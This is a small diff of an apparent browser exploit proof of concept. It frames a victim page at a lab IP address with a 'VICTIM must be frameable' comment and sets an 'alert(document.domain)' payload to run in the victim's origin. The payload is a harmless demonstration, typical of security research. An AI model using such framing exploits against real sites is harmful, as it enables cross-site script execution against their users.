@@ -2,9 +2,10 @@
 
 <script>
 
-VICTIM='http://10.13.37.2:9000/XXXXXXX';
-PAYLOAD='alert(document.domain)';
-WAIT=5000;
+// Victim page has to be frameable
+VICTIM = 'http://10.13.37.2:9000/XXXXXXX';
+PAYLOAD = 'alert(document.domain)';
+WAIT = 5000;
 
 victim = document.getElementById('victim');
 victim.src = VICTIM;
